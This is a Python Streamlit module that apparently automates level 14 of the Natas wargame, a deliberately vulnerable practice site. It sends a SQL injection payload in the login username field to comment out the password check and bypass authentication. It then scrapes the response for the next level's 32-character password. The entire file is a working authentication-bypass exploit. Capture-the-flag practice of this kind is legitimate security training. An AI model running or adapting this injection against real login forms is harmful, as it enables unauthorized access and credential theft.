import streamlit as st
import re

def run(context, session, base_url):
    st.info("Targeting vulnerable database string concatenation via query structure manipulation...")
    
    # Define the payload designed to isolate the row context and comment out trailing SQL logic
    injection_payload = 'natas15" #'
    
    # Structure the POST body data parameters
    post_payload = {
        "username": injection_payload,
        "password": "",  # Disregarded by the database due to the comment symbol
        "submit": "Login"
    }
    
    try:
        st.write(f"📤 Transmitting authentication parameter payload: `{injection_payload}`")
        response = session.post(base_url, data=post_payload, timeout=10)
        
        if response.status_code == 200:
            # 1. Find ALL 32-character alphanumeric strings on the page
            all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', response.text)
            
            # 2. Grab the current level password to filter it out
            current_password = context.get('password', '')
            
            # 3. Filter the list to find the newly exposed password
            new_tokens = [t for t in all_tokens if t != current_password]
            
            if new_tokens:
                st.success("🎯 Level 14 challenge resolved successfully!")
                st.code(f"Natas 15 Password: {new_tokens[0]}")
            elif "You are logged in as a user." in response.text:
                st.success("🔓 SQL structural bypass executed successfully, but no new password token text was found on the page.")
                with st.expander("Examine Response Document Source"):
                    st.code(response.text, language="html")
            else:
                st.error("The injection payload did not return a successful login state or password token.")
                with st.expander("Examine Diagnostic Return Details"):
                    st.code(response.text, language="html")
        else:
            st.error(f"The web container returned an unexpected response profile. Status Code: {response.status_code}")
            
    except Exception as e:
        st.error(f"Module execution architecture sequence failed: {str(e)}")